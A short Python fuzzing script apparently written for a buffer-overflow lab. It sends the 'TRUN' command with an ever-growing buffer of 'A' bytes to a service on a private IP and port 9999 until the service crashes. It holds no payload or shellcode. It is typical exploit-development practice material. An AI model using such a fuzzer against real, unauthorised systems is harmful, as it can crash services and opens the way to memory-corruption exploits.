#!/usr/bin/python3
import socket
import time

target = "192.168.1.138"
port = 9999

buffer = b"A" * 100

while True:
    try:
        print(f"Fuzzing with {len(buffer)} bytes")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(b"TRUN /.:/" + buffer)
        s.close()
        buffer += b"A" * 100
        time.sleep(1)
    except:
        print("Crash detected!")
        break
